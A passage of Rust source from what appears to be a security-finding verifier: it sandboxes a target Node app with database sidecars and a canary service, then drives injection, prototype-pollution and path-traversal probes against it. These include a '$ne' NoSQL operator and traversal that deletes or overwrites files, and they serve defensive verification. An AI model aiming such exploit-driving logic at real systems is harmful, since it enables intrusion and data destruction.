            if let Some(path) = new_dotenv {
                self.stage_local_dotenv_file(&path)?;
                dotenv_files.push(path);
            }
        }
        Err("the app still could not start after five launch attempts".to_owned())
    }

    /// Stages the verifier's throwaway matching TLS pair only at a path inside the disposable local
    /// checkout. This mirrors the container retry without ever writing elsewhere on the host.
    fn stage_local_tls_file(&mut self, path: &str, is_key: bool) -> Result<(), String> {
        let contents = if is_key { MARKER_KEY } else { MARKER_CERT };
        self.stage_local_checkout_file(path, contents.as_bytes(), "TLS material")
    }

    /// Uses the repository's documented dotenv template when present; otherwise an empty dotenv
    /// file lets loaders proceed with their normal defaults without inventing configuration.
    fn stage_local_dotenv_file(&mut self, path: &str) -> Result<(), String> {
        let target = std::path::Path::new(path);
        let parent = target
            .parent()
            .ok_or_else(|| format!("dotenv path has no parent: {path}"))?;
        let contents = [".env.example", ".env.sample", ".env.template"]
            .iter()
            .map(|name| parent.join(name))
            .find_map(|candidate| std::fs::read(candidate).ok())
            .unwrap_or_default();
        self.stage_local_checkout_file(path, &contents, "dotenv")
    }

    /// Writes a startup fixture only inside the disposable checkout and records it for teardown.
    fn stage_local_checkout_file(
        &mut self,
        path: &str,
        contents: &[u8],
        kind: &str,
    ) -> Result<(), String> {
        let Runtime::Local {
            checkout_root,
            created_files,
            ..
        } = &mut self.runtime
        else {
            return Err("local startup-file staging requested for a Docker session".to_owned());
        };
        let root = checkout_root
            .canonicalize()
            .map_err(|error| format!("resolving local checkout root: {error}"))?;
        let target = std::path::PathBuf::from(path);
        let parent = target
            .parent()
            .ok_or_else(|| format!("startup-file path has no parent: {path}"))?
            .canonicalize()
            .map_err(|error| format!("resolving TLS parent for {path}: {error}"))?;
        if !parent.starts_with(&root) {
            return Err(format!(
                "refusing to stage {kind} outside the local checkout: {path}"
            ));
        }
        std::fs::write(&target, contents)
            .map_err(|error| format!("staging local {kind} at {path}: {error}"))?;
        created_files.push(target);
        Ok(())
    }

    fn run_local_app(
        &self,
        env: &[RequiredEnv],
        stub_missing_modules: bool,
        mongodb_callback_promises: bool,
        next_development: bool,
        scratch_dirs: &[String],
    ) -> Result<(), String> {
        let Runtime::Local {
            checkout_root,
            app_root,
            log,
            command,
            process,
            ..
        } = &self.runtime
        else {
            return Err("local application requested for a Docker session".to_owned());
        };
        if let Some(mut previous) = process.borrow_mut().take() {
            stop_local_process(&mut previous);
        }
        for var in env {
            if var.directory {
                let value = localize_helper_paths(&var.value);
                std::fs::create_dir_all(&value)
                    .map_err(|error| format!("creating {value}: {error}"))?;
            }
        }
        for dir in scratch_dirs {
            let dir = localize_helper_paths(dir);
            std::fs::create_dir_all(&dir).map_err(|error| format!("creating {dir}: {error}"))?;
        }
        if self.run_as.is_some() {
            Self::make_local_run_as_accessible(checkout_root, app_root, env, scratch_dirs)?;
        }
        let stdout = std::fs::File::create(log)
            .map_err(|error| format!("creating local verifier log: {error}"))?;
        let stderr = stdout
            .try_clone()
            .map_err(|error| format!("opening local verifier log: {error}"))?;
        let next_command = next_development
            .then(|| next_development_command(app_root, self.port))
            .flatten();
        let command = next_command.as_ref().unwrap_or(command);
        let (program, args) = command
            .split_first()
            .ok_or_else(|| "generated start command is empty".to_owned())?;
        let mut child = Command::new(program);
        // Package-manager launchers (`npm start`, `yarn …`) keep the application as a child
        // process. Give every launch its own process group so teardown removes that child too;
        // otherwise it can keep the HTTP port and the next finding is accidentally tested against
        // the preceding repository/service.
        #[cfg(unix)]
        {
            use std::os::unix::process::CommandExt;
            child.process_group(0);
            if let Some((uid, gid)) = self.run_as {
                let current = current_unix_identity().ok_or_else(|| {
                    "local verification could not determine its runtime user".to_owned()
                })?;
                if current == (0, 0) {
                    child.gid(gid).uid(uid);
                } else if current != (uid, gid) {
                    return Err(format!(
                        "local verification cannot run the application as uid {uid}, gid {gid}"
                    ));
                }
            }
        }
        child
            .args(args)
            .current_dir(app_root)
            .env("PORT", self.port.to_string())
            .env("HOST", "127.0.0.1")
            .env("NODE_ENV", verifier_node_env())
            .stdout(stdout)
            .stderr(stderr);
        if let Some(node_path) = &self.node_path {
            child.env("NODE_PATH", node_path);
        }
        let mut node_options = Vec::new();
        if self.node_sqlite {
            node_options.push("--experimental-sqlite");
        }
        if stub_missing_modules || mongodb_callback_promises {
            node_options.push("--require=/tmp/jss-launch-shim.js");
        }
        if stub_missing_modules && !self.guarded_modules.is_empty() {
            child.env("JSS_GUARDED_MODULES", self.guarded_modules.join(","));
        }
        if mongodb_callback_promises {
            child.env("JSS_MONGODB_CALLBACK_PROMISES", "1");
        }
        if !node_options.is_empty() {
            child.env("NODE_OPTIONS", node_options.join(" "));
        }
        for var in env {
            child.env(&var.name, localize_helper_paths(&var.value));
        }
        for (name, value) in self.db_env.iter().chain(&self.redis_env) {
            child.env(name, value);
        }
        let child = child
            .spawn()
            .map_err(|error| format!("starting local application: {error}"))?;
        process.replace(Some(child));
        Ok(())
    }

    /// A root-owned `mktemp -d` checkout is mode 0700, so an application deliberately launched as
    /// an unprivileged uid cannot even traverse to its entry file. Add read/traverse permission only
    /// to the disposable checkout chain and make verifier-created runtime directories writable. The
    /// application still runs without privileges and receives no access outside those fixtures.
    #[cfg(unix)]
    fn make_local_run_as_accessible(
        checkout_root: &std::path::Path,
        app_root: &std::path::Path,
        env: &[RequiredEnv],
        scratch_dirs: &[String],
    ) -> Result<(), String> {
        use std::os::unix::fs::PermissionsExt;

        let boundary = checkout_root.parent().unwrap_or(checkout_root);
        let mut directories = app_root
            .ancestors()
            .take_while(|path| path.starts_with(boundary))
            .map(std::path::Path::to_path_buf)
            .collect::<Vec<_>>();
        directories.push(boundary.to_path_buf());
        directories.sort();
        directories.dedup();
        for directory in directories {
            let metadata = std::fs::metadata(&directory)
                .map_err(|error| format!("reading {} permissions: {error}", directory.display()))?;
            let mut permissions = metadata.permissions();
            permissions.set_mode(permissions.mode() | 0o055);
            std::fs::set_permissions(&directory, permissions).map_err(|error| {
                format!("opening {} to the app uid: {error}", directory.display())
            })?;
        }
        for directory in env
            .iter()
            .filter(|var| var.directory)
            .map(|var| localize_helper_paths(&var.value))
            .chain(scratch_dirs.iter().map(|dir| localize_helper_paths(dir)))
        {
            let metadata = std::fs::metadata(&directory)
                .map_err(|error| format!("reading {directory} permissions: {error}"))?;
            let mut permissions = metadata.permissions();
            permissions.set_mode(permissions.mode() | 0o777);
            std::fs::set_permissions(&directory, permissions)
                .map_err(|error| format!("making {directory} writable to the app uid: {error}"))?;
        }
        Ok(())
    }

    #[cfg(not(unix))]
    fn make_local_run_as_accessible(
        _checkout_root: &std::path::Path,
        _app_root: &std::path::Path,
        _env: &[RequiredEnv],
        _scratch_dirs: &[String],
    ) -> Result<(), String> {
        Ok(())
    }

    /// Starts the marker service and the app, and waits for the app to listen.
    fn boot(&mut self) -> Result<(), String> {
        // The marker service: records every path it is asked for. Reached only from inside the
        // private network, as `jss-marker`.
        let mut marker_args = vec![
            "run".to_owned(),
            "-d".to_owned(),
            "--name".to_owned(),
            self.marker.clone(),
            "--network".to_owned(),
            self.network.clone(),
            "--network-alias".to_owned(),
            "jss-marker".to_owned(),
        ];
        if let Some(host) = self.canary.callback_host() {
            marker_args.extend(["--network-alias".to_owned(), host.to_owned()]);
        }
        marker_args.extend([
            "--entrypoint".to_owned(),
            "node".to_owned(),
            self.tag.clone(),
            "/jss-marker.js".to_owned(),
        ]);
        let marker_args: Vec<&str> = marker_args.iter().map(String::as_str).collect();
        docker(&marker_args).map_err(|e| format!("could not start the marker service: {e}"))?;

        if self.db.is_some() {
            self.start_db()?;
            // Load the app's own shipped database seed (a `mongodump` in the repo) before launch, so
            // its startup initialization finds the configuration it reads out of its own collections.
            self.restore_db_dump();
        }
        if self.redis.is_some() {
            self.start_redis()?;
        }

        // An app that refuses to start without an environment variable its deployment supplies
        // (`NOOBOT_WORKSPACE_ROOT is required`) is started again with it set to a neutral value
        // (see [`required_env`]), a few times at most.
        let mut env: Vec<RequiredEnv> = self.base_env.clone();
        let mut stub_missing_modules = false;
        let mut mongodb_callback_promises = false;
        // Directories the app tried to write into on startup before their parent existed
        // (see [`missing_write_dir`]); mounted as empty writable scratch on the next attempt.
        let mut scratch_dirs: Vec<String> = Vec::new();
        // TLS key/cert files the app reads to stand up an `https`/`tls` server before it listens
        // (see [`missing_tls_material`]); staged from the self-signed marker pair on the next
        // attempt so the server can bind. Each entry is (container path, is_key).
        let mut cert_files: Vec<(String, bool)> = Vec::new();
        let mut generated_config_retry = false;
        for _ in 0..5 {
            self.tls = !cert_files.is_empty();
            self.run_app(
                &env,
                stub_missing_modules,
                mongodb_callback_promises,
                &scratch_dirs,
                &cert_files,
            )?;
            let err = match self.wait_until_listening() {
                Ok(port) => {
                    self.port = port;
                    self.seed_db();
                    return Ok(());
                }
                Err(err) => err,
            };
            let mut missing: Vec<RequiredEnv> = Vec::new();
            for wanted in required_env(&err)
                .into_iter()
                .chain(config_env(&err, &self.root))
            {
                if env.iter().all(|have| have.name != wanted.name)
                    && missing.iter().all(|have| have.name != wanted.name)
                {
                    missing.push(wanted);
                }
            }
            let enable_module_stub = !stub_missing_modules && missing_bare_module(&err);
            let enable_mongodb_callback_promises =
                !mongodb_callback_promises && missing_mongodb_collection_promise(&err);
            let new_dir = missing_write_dir(&err).filter(|dir| !scratch_dirs.contains(dir));
            let new_cert = missing_tls_material(&err)
                .filter(|(path, _)| cert_files.iter().all(|(have, _)| have != path));
            let retry_generated_config = !generated_config_retry && generated_startup_config(&err);
            if missing.is_empty()
                && !enable_module_stub
                && !enable_mongodb_callback_promises
                && new_dir.is_none()
                && new_cert.is_none()
                && !retry_generated_config
            {
                return Err(err);
            }
            remove_container(&self.app);
            env.extend(missing);
            stub_missing_modules |= enable_module_stub;
            mongodb_callback_promises |= enable_mongodb_callback_promises;
            generated_config_retry |= retry_generated_config;
            if let Some(dir) = new_dir {
                scratch_dirs.push(dir);
            }
            if let Some(cert) = new_cert {
                cert_files.push(cert);
            }
        }
        Err("the app still could not start after five launch attempts".to_owned())
    }

    /// Starts the app container, with `env` on top of the variables every app gets, and
    /// `scratch_dirs` mounted as empty writable tmpfs (directories the app writes into on startup
    /// before creating them; see [`missing_write_dir`]).
    fn run_app(
        &self,
        env: &[RequiredEnv],
        stub_missing_modules: bool,
        mongodb_callback_promises: bool,
        scratch_dirs: &[String],
        cert_files: &[(String, bool)],
    ) -> Result<(), String> {
        // The app: on the private network, hardened, its scratch space in tmpfs, no extra
        // privileges, bounded memory, CPUs and processes.
        let mut args: Vec<String> = [
            "run",
            "-d",
            "--name",
            &self.app,
            "--network",
            &self.network,
            "--cap-drop",
            "ALL",
            "--security-opt",
            "no-new-privileges",
            "--pids-limit",
            "256",
            "--memory",
            "1g",
            "--cpus",
            "2",
            "--tmpfs",
            "/tmp:exec",
            "-e",
            &format!("PORT={}", self.port),
            "-e",
            "HOST=0.0.0.0",
            "-e",
            &format!("NODE_ENV={}", verifier_node_env()),
        ]
        .iter()
        .map(|s| (*s).to_owned())
        .collect();
        // Dependencies installed in a sibling package that bundles this module: point the module's
        // module resolution at that package's `node_modules`, the way the real app does for its
        // bundled code.
        if let Some(node_path) = &self.node_path {
            args.push("-e".to_owned());
            args.push(format!("NODE_PATH={node_path}"));
        }
        // An app that drops root at startup is run as the very uid/gid it drops to, so its
        // `setuid`/`setgid` are legal no-ops to the identity it already holds: the process ends up
        // unprivileged exactly as designed, with no capability added and nothing suppressed.
        if let Some((uid, gid)) = self.run_as {
            args.push("--user".to_owned());
            args.push(format!("{uid}:{gid}"));
        }
        // Node's built-in `node:sqlite` only loads with the `--experimental-sqlite` runtime flag; add
        // it only for an app that references that module, so its own database initialization succeeds
        // instead of throwing on an unavailable module. Adding it for an app that does not use the
        // module changes nothing. The missing-module stub is added only on the launch attempt that
        // needs it.
        let mut node_options: Vec<String> = Vec::new();
        if self.node_sqlite {
            node_options.push("--experimental-sqlite".to_owned());
        }
        if stub_missing_modules || mongodb_callback_promises {
            node_options.push("--require=/jss-launch-shim.js".to_owned());
        }
        if stub_missing_modules {
            // Modules the entry file `require`s inside a `try`/`catch` are ones it tolerates the
            // absence of: let the shim re-throw their `MODULE_NOT_FOUND` so the app's own fallback
            // runs, instead of handing back an inert stub whose truthy value crashes that fallback.
            if !self.guarded_modules.is_empty() {
                args.push("-e".to_owned());
                args.push(format!(
                    "JSS_GUARDED_MODULES={}",
                    self.guarded_modules.join(",")
                ));
            }
        }
        if mongodb_callback_promises {
            args.push("-e".to_owned());
            args.push("JSS_MONGODB_CALLBACK_PROMISES=1".to_owned());
        }
        if !node_options.is_empty() {
            args.push("-e".to_owned());
            args.push(format!("NODE_OPTIONS={}", node_options.join(" ")));
        }
        for var in env {
            // A directory the app names by a variable: its own empty scratch space.
            if var.directory {
                args.push("--tmpfs".to_owned());
                args.push(var.value.clone());
            }
            args.push("-e".to_owned());
            args.push(format!("{}={}", var.name, var.value));
        }
        // A directory the app writes into at startup before ensuring it exists: its own empty,
        // writable scratch space, so the app's own state seeding succeeds instead of crashing.
        for dir in scratch_dirs {
            args.push("--tmpfs".to_owned());
            args.push(dir.clone());
        }
        for (name, value) in &self.db_env {
            args.push("-e".to_owned());
            args.push(format!("{name}={value}"));
        }
        for (name, value) in &self.redis_env {
            args.push("-e".to_owned());
            args.push(format!("{name}={value}"));
        }
        args.push(self.tag.clone());
        // A TLS server reads its key/cert off the filesystem before it listens; when those files are
        // absent the app exits on startup. Stage the self-signed marker pair (already baked into the
        // image, and trusted by the app through `NODE_EXTRA_CA_CERTS`) at the exact paths the app
        // read, then `exec` the app's own launch command unchanged. This satisfies a genuine runtime
        // precondition — a server needs a certificate to serve TLS — without altering the app, and
        // the key/cert are a matching pair so the handshake the driver performs is real.
        if let Some(command) = self.cert_staging_command(cert_files) {
            args.push("sh".to_owned());
            args.push("-c".to_owned());
            args.push(command);
        }
        let args: Vec<&str> = args.iter().map(String::as_str).collect();
        docker(&args).map_err(|e| format!("could not start the app: {e}"))?;
        Ok(())
    }

    /// The `sh -c` launch wrapper that stages each requested TLS key/cert file from the baked
    /// self-signed marker pair (`/jss-marker.key`, `/jss-marker.crt`) and then `exec`s the app's own
    /// launch command (the image `CMD`), or `None` when nothing needs staging. The app's command is
    /// taken verbatim from its manifest/entry (see [`start_command`]); only a filesystem fixture is
    /// added ahead of it.
    fn cert_staging_command(&self, cert_files: &[(String, bool)]) -> Option<String> {
        if cert_files.is_empty() {
            return None;
        }
        let argv: Vec<String> = serde_json::from_str(&self.start_command).ok()?;
        if argv.is_empty() {
            return None;
        }
        let exec = argv
            .iter()
            .map(|word| shell_quote(word))
            .collect::<Vec<_>>()
            .join(" ");
        let mut script = String::new();
        for (path, is_key) in cert_files {
            let source = if *is_key {
                "/jss-marker.key"
            } else {
                "/jss-marker.crt"
            };
            script.push_str(&format!("cp {} {} && ", source, shell_quote(path)));
        }
        script.push_str(&format!("exec {exec}"));
        Some(script)
    }

    fn start_db(&self) -> Result<(), String> {
        let Some(db) = self.db.as_deref() else {
            return Ok(());
        };
        let mut args = vec!["run", "-d", "--name", db, "--network", &self.network];
        for alias in DB_ALIASES {
            args.push("--network-alias");
            args.push(alias);
        }
        args.push(DB_IMAGE);
        docker(&args).map_err(|error| format!("could not start the database sidecar: {error}"))?;
        for _ in 0..40 {
            let ping = self.exec(
                db,
                &["mongosh", "--quiet", "--eval", "db.runCommand({ping:1}).ok"],
            );
            if ping
                .ok()
                .filter(|output| output.status.success())
                .is_some_and(|output| String::from_utf8_lossy(&output.stdout).trim() == "1")
            {
                return Ok(());
            }
            if !self.container_running(db) {
                return Err(format!(
                    "the database sidecar exited before it was ready:\n{}",
                    self.tail_logs(db)
                ));
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        Err("the database sidecar did not become ready within 40s".to_owned())
    }

    fn start_redis(&self) -> Result<(), String> {
        let Some(redis) = self.redis.as_deref() else {
            return Ok(());
        };
        let mut args = vec!["run", "-d", "--name", redis, "--network", &self.network];
        for alias in REDIS_ALIASES {
            args.push("--network-alias");
            args.push(alias);
        }
        args.push(REDIS_IMAGE);
        docker(&args).map_err(|error| format!("could not start the Redis sidecar: {error}"))?;
        for _ in 0..40 {
            let ping = self.exec(redis, &["redis-cli", "ping"]);
            if ping
                .ok()
                .filter(|output| output.status.success())
                .is_some_and(|output| String::from_utf8_lossy(&output.stdout).trim() == "PONG")
            {
                return Ok(());
            }
            if !self.container_running(redis) {
                return Err(format!(
                    "the Redis sidecar exited before it was ready:\n{}",
                    self.tail_logs(redis)
                ));
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        Err("the Redis sidecar did not become ready within 40s".to_owned())
    }

    /// Load the application's own database seed into the sidecar before launch, when the repository
    /// ships a `mongodump` (a directory of `<collection>.bson` files beside their `.metadata.json`).
    /// A real deployment restores this dump, so the app's startup initialization — which reads
    /// required configuration (a JWT signing secret, feature flags) out of its own collections and
    /// crashes when they are absent — finds the data it needs and the server reaches `listen`. The
    /// dump is restored into the verifier's application database, the one the app is pointed at, so
    /// the running server reads it exactly as it would in production. Best-effort: a repository with
    /// no dump, or a restore error, leaves the database empty — the same state as before.
    fn restore_db_dump(&self) {
        let Some(db) = self.db.as_deref() else {
            return;
        };
        let Some(dump) = mongodump_dir(&self.root) else {
            return;
        };
        let Some(dump_str) = dump.to_str() else {
            return;
        };
        let dest = format!("{db}:/jss-db-dump");
        if Command::new("docker")
            .args(["cp", dump_str, &dest])
            .output()
            .is_err()
        {
            return;
        }
        let output = self.exec(
            db,
            &["mongorestore", "--drop", "--db", DB_NAME, "/jss-db-dump"],
        );
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            let (code, message) = match output {
                Ok(output) => (
                    output.status.code(),
                    String::from_utf8_lossy(&output.stderr)
                        .lines()
                        .last()
                        .unwrap_or_default()
                        .to_owned(),
                ),
                Err(error) => (None, error),
            };
            eprintln!("[verify] db restore {dump_str} -> {code:?} {message}");
        }
    }

    fn seed_db(&self) {
        let Some(db) = self.db.as_deref() else {
            return;
        };
        let script = "db.getMongo().getDBNames().forEach(function(n){\
            if(['admin','local','config'].indexOf(n)>=0)return;\
            var d=db.getSiblingDB(n);\
            d.getCollectionNames().forEach(function(c){\
              try{if(d.getCollection(c).countDocuments({})===0)\
                d.getCollection(c).insertOne({jss_seed:1});}catch(e){}\
            });\
          });";
        let output = self.exec(db, &["mongosh", "--quiet", "--eval", script]);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            let (code, message) = match output {
                Ok(output) => (
                    output.status.code(),
                    String::from_utf8_lossy(&output.stderr).trim().to_owned(),
                ),
                Err(error) => (None, error),
            };
            let list = "db.getMongo().getDBNames().forEach(function(n){\
                if(['admin','local','config'].indexOf(n)>=0)return;\
                var d=db.getSiblingDB(n);\
                d.getCollectionNames().forEach(function(c){\
                  print(n+'.'+c+'='+d.getCollection(c).countDocuments({}));\
                });\
              });";
            let listing = self
                .exec(db, &["mongosh", "--quiet", "--eval", list])
                .ok()
                .map(|o| {
                    String::from_utf8_lossy(&o.stdout)
                        .trim()
                        .replace('\n', " | ")
                })
                .unwrap_or_default();
            eprintln!("[verify] db seed -> {code:?} {message} || state: {listing}");
        }
    }

    /// Turn on full operation profiling on every application database. A read-only query sink
    /// (`Model.findOne(...)`) never creates its collection on a driver that does not auto-create on
    /// read (Mongoose 5's `autoCreate` defaults off), so the startup seed cannot know the collection
    /// exists and the match-all/match-none differential has no document to observe. Profiling records
    /// the namespace of every command the server receives, so a single benign request reveals exactly
    /// which collection(s) the sink reads — without guessing a name from the source. Enable it before
    /// the benign probe request; [`Session::seed_profiled_collections`] consumes the log afterwards.
    fn enable_db_profiling(&self) {
        let Some(db) = self.db.as_deref() else {
            return;
        };
        let _ = self.exec(
            db,
            &["mongosh", "--quiet", "--eval", ENABLE_PROFILING_SCRIPT],
        );
    }

    /// Read the profiler log written since [`Session::enable_db_profiling`], and for every collection
    /// a command targeted that is still empty, insert one seed document. This materializes exactly the
    /// collections the sink's request actually queried — including a read-only sink's collection the
    /// driver never auto-created — so a match-all operator (`{$ne}`) can return a record the match-none
    /// controls (`$eq`, `$in: []`) do not. Profiling is then disabled and its capped log dropped so the
    /// seeded documents are the only state the differential depends on.
    fn seed_profiled_collections(&self) {
        let Some(db) = self.db.as_deref() else {
            return;
        };
        let _ = self.exec(db, &["mongosh", "--quiet", "--eval", SEED_PROFILED_SCRIPT]);
    }

    /// Plant a single record that a document-filtering NoSQL sink's own query selects, so the
    /// match-all/match-none differential has a pre-existing document to move. Profiling is turned on,
    /// one benign match-none request is sent — its injected field carries the per-run sentinel, so the
    /// recorded query filter contains it — and the observed filter is turned into a document: each
    /// scalar equality is copied verbatim (the `email` the handler ANDs in), and the one operator
    /// field that references the sentinel is set to a present value that the match-all `{$ne:<sentinel>}`
    /// selects while the match-none controls (`$eq`, `$in: []`) do not. Guard queries that do not
    /// reference the sentinel — an earlier `{verified:true}` pre-check that must *not* match for the
    /// sink to run — contribute no fields, so the planted record stays reachable. Every collection,
    /// field and value comes from the query the app actually ran; nothing is derived from a name.
    fn seed_nosql_lookup_record(&self, cases: &[payload::NosqlCase]) {
        let Some(db) = self.db.as_deref() else {
            return;
        };
        let Some(first) = cases.first() else {
            return;
        };
        self.enable_db_profiling();
        let _ = self.fetch(&first.match_none_eq);
        std::thread::sleep(std::time::Duration::from_secs(2));
        let script = nosql_lookup_seed_script(&first.absent);
        let output = self.exec(db, &["mongosh", "--quiet", "--eval", &script]);
        if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
            let (code, message) = match output {
                Ok(output) => (
                    output.status.code(),
                    String::from_utf8_lossy(&output.stdout).trim().to_owned(),
                ),
                Err(error) => (None, error),
            };
            eprintln!("[verify] nosql lookup seed -> {code:?} {message}");
        }
    }

    /// Polls from inside the app's own container until the app answers on a port, or the
    /// deadline passes, and returns that port.
    fn wait_until_listening(&self) -> Result<u16, String> {
        // Up to ~90s: `npm start` may build first. The probe is one Node connect attempt.
        // A local session shares its network namespace with its datastore sidecars. Their ports are
        // already listening before the application starts and must not be mistaken for a hard-coded
        // application HTTP port while `npm start` is still booting.
        let excluded = match &self.runtime {
            Runtime::Local { .. } => local_excluded_ports(
                &self.local_baseline_ports,
                self.local_marker_port,
                self.db.is_some(),
                self.redis.is_some(),
            ),
            Runtime::Docker => Vec::new(),
        };
        for _ in 0..90 {
            let candidates = if matches!(&self.runtime, Runtime::Local { .. }) {
                local_listening_ports()
                    .into_iter()
                    .filter(|port| !self.local_baseline_ports.contains(port))
                    .collect::<Vec<_>>()
            } else {
                Vec::new()
            };
            let script = listening_probe_excluding_candidates(self.port, &excluded, &candidates);
            let probe = self.exec(&self.app, &["node", "-e", &script]);
            if let Some(port) = probe.ok().filter(|o| o.status.success()).and_then(|o| {
                String::from_utf8_lossy(&o.stdout)
                    .trim()
                    .parse::<u16>()
                    .ok()
            }) {
                return Ok(port);
            }
            // Give up early if the app container has already exited.
            if !self.container_running(&self.app) {
                return Err(format!(
                    "the app exited before it listened:\n{}",
                    self.settled_tail_logs(&self.app)
                ));
            }
            std::thread::sleep(std::time::Duration::from_secs(1));
        }
        Err(format!(
            "the app did not listen within 90s:\n{}",
            self.tail_logs(&self.app)
        ))
    }

    /// Sends every derived request for a probe and reports the first that reproduces, or that
    /// none did.
    pub fn exercise(&mut self, probe: &Probe) -> Outcome {
        self.nonce += 1;
        if probe.class == jss_core::VulnClass::NosqlInjection {
            return self.exercise_nosql(probe);
        }
        if probe.class == jss_core::VulnClass::SqlInjection {
            return self.exercise_sql(probe);
        }
        // A nested-write prototype-pollution sink cannot be proved by reflected content: the written
        // value is the handler's own, not attacker data, so observing input in the write proves only
        // reachability. Prove it instead by reading the injected property back off a *fresh* object
        // through the handler — a property that object never had until `__proto__` was written — with
        // the pre-pollution read and an unpolluted-key read as negative controls.
        if probe.class == jss_core::VulnClass::PrototypePollution {
            return match self.verify_proto_pollution(probe) {
                Some(poc) => Outcome::Verified {
                    how: format!("{} {}", poc.method, poc.target),
                    poc,
                },
                None => Outcome::NotReproduced { tried: 1 },
            };
        }
        // A traversal sink that deletes its argument cannot be proved by reflected content — a
        // successful delete echoes nothing — and the generic climbing attempts would consume the
        // planted canary before any differential ran. Prove it directly: plant a filesystem entry
        // outside the base directory, drive the handler to remove it by traversal, and confirm it
        // disappeared while a sibling control entry planted alongside it survived.
        if probe.class == jss_core::VulnClass::PathTraversal && probe.removes {
            return match self.verify_delete_oracle(probe) {
                Some(poc) => Outcome::Verified {
                    how: format!("{} {}", poc.method, poc.target),
                    poc,
                },
                None => Outcome::NotReproduced { tried: 1 },
            };
        }
        if probe.class == jss_core::VulnClass::PathTraversal && probe.archive_upload {
            return match self.verify_archive_create_oracle(probe) {
                Some(poc) => Outcome::Verified {
                    how: format!("{} {}", poc.method, poc.target),
                    poc,
                },
                None => Outcome::NotReproduced { tried: 1 },
            };
        }
        // A traversal sink that creates its argument (`fs.mkdir`, `fs.writeFile`, an upload move)
        // cannot be proved by reflected content either — a successful create echoes nothing. Prove it
        // directly: plant an empty directory outside the base, drive the handler to create an entry
        // inside it by traversal, and confirm the directory became non-empty while a sibling control
        // directory planted alongside it stayed empty.
        if probe.class == jss_core::VulnClass::PathTraversal && probe.creates {
            if let Some(poc) = self.verify_create_oracle(probe) {
                return Outcome::Verified {
                    how: format!("{} {}", poc.method, poc.target),
                    poc,
                };
            }
            // A read-modify-write handler (`fs.writeFile` after opening the same path) never creates a
            // brand-new leaf: it reads the target first, so the create differential cannot fire. Prove
            // it instead by overwriting an attacker-selected *existing* file outside the base, with an
            // untouched sibling control.
            if let Some(poc) = self.verify_overwrite_oracle(probe) {
                return Outcome::Verified {
                    how: format!("{} {}", poc.method, poc.target),
                    poc,
                };
            }
            return Outcome::NotReproduced { tried: 1 };
        }
        // A traversal *read* sink that appends a fixed segment after the tainted input reads
        // `<tainted-dir>/<suffix>`. Plant the canary file at that location so the climbing payloads,
        // completed by the handler's own appended segment, resolve to a real token file. A listing
        // sink is handled below: it needs a directory, not a file, at the appended segment.
        if probe.class == jss_core::VulnClass::PathTraversal
            && !probe.lists_dir
            && let Some(suffix) = &probe.read_suffix
        {
            self.plant_suffix_canary(suffix);
        }
        // A directory-listing traversal proves itself by a planted file name appearing in the
        // returned listing. Plant a token-named file inside the directory the handler enumerates:
        // under each accepted sibling value it appends from the route (`path.join(base, kind)`), so a
        // climb completed by an accepted slot value lands on a real planted directory; otherwise
        // directly in the climbed-to directory. The fixed-segment (`read_suffix`) case is planted as
        // a file above, only for a byte read — a listing sink reaches a planted value directory here.
        if probe.class == jss_core::VulnClass::PathTraversal && probe.lists_dir {
            match &probe.appended_param {
                Some(ap) => {
                    for value in &ap.values {
                        self.plant_listing_canary(value, self.nonce);
                    }
                }
                None => self.plant_listing_canary("", self.nonce),
            }
        }
        // Try the three-leg read differential before the broad reflected-content payload matrix for
        // every anonymous traversal read. Besides being stronger evidence for a blind read, this
        // keeps URL-sourced sinks tractable: a renderer can expose many query fields, and trying the
        // full filename/encoding matrix for every field may perform hundreds of expensive renders
        // before reaching the one field connected to the sink. The oracle follows the mined query
        // fields in data-flow order and normally reaches that field in a handful of requests. If it
        // cannot distinguish the found and missing branches, the broad matrix remains the fallback.
        // Authenticated probes retain the normal order because the oracle requests do not yet carry
        // bootstrapped sessions.
        let read_oracle_tried_early = probe.class == jss_core::VulnClass::PathTraversal
            && !probe.lists_dir
            && probe.auth.is_none();
        if read_oracle_tried_early && let Some(poc) = self.verify_read_oracle(probe) {
            return Outcome::Verified {
                how: format!("{} {}", poc.method, poc.target),
                poc,
            };
        }
        let mut attempts = payload::attempts(probe, &self.canary, self.nonce);
        // A sink gated behind a session the handler looks up from a request cookie it reads itself is
        // an authenticated-user sink, not an anonymous one: mint a genuine session through the app's
        // own registration/login routes and replay each request carrying that token under the cookie
        // the handler reads (and the bearer header, for a handler that reads it there). Some apps also
        // mount their JSON body parser after this route, reading the body only as a form submission,
        // so each JSON-body attempt gets a form-urlencoded twin. A session the app never issued cannot
        // be forged, so this reaches only a sink a real logged-in request would.
        if let Some(boot) = &probe.auth {
            if let Some(token) = self.obtain_session(boot) {
                let mut decorated = Vec::with_capacity(attempts.len() * 2);
                for attempt in &attempts {
                    let with = payload::with_session(attempt, &boot.cookie, &token);
                    if let Some(form) = payload::urlencoded_twin(&with) {
                        decorated.push(form);
                    }
                    decorated.push(with);
                }
                attempts = decorated;
            } else if std::env::var_os("JSS_VERIFY_DEBUG").is_some() {
                eprintln!(
                    "[verify] auth-bootstrap could not obtain a session (login={:?} register={:?})",
                    boot.login_paths, boot.register_paths
                );
            }
        }
        let tried = attempts.len();
        // First pass carries the synthetic forwarding header (rate-limit de-bucketing); if nothing
        // reproduces, retry once representing the request's true loopback origin (no forwarding
        // header). An app that gates its sink on genuine loopback trust — a management route that
        // treats any forwarding header as a remote proxy hop — refuses the de-bucketed request before
        // the sink, so the honest loopback request is the one that reaches it. The driver already
        // connects from loopback; this never grants access a non-loopback peer would be denied.
        for forward in [true, false] {
            self.omit_forwarding.set(!forward);
            for attempt in &attempts {
                if let Some(poc) = self.send(attempt) {
                    self.omit_forwarding.set(false);
                    return Outcome::Verified {
                        how: format!("{} {}", poc.method, poc.target),
                        poc,
                    };
                }
            }
        }
        self.omit_forwarding.set(false);
        // Fallback for a read sink that consumes the planted file but never echoes it (the handler
        // reads it and then crashes or renders without reflecting its bytes): prove the traversal by
        // a differential file-found/not-found oracle instead of by content in the response.
        if !read_oracle_tried_early && let Some(poc) = self.verify_read_oracle(probe) {
            return Outcome::Verified {
                how: format!("{} {}", poc.method, poc.target),
                poc,
            };
        }
        Outcome::NotReproduced { tried }
    }

    /// Drives a server-reflected XSS: the live app has already been launched, so request its route
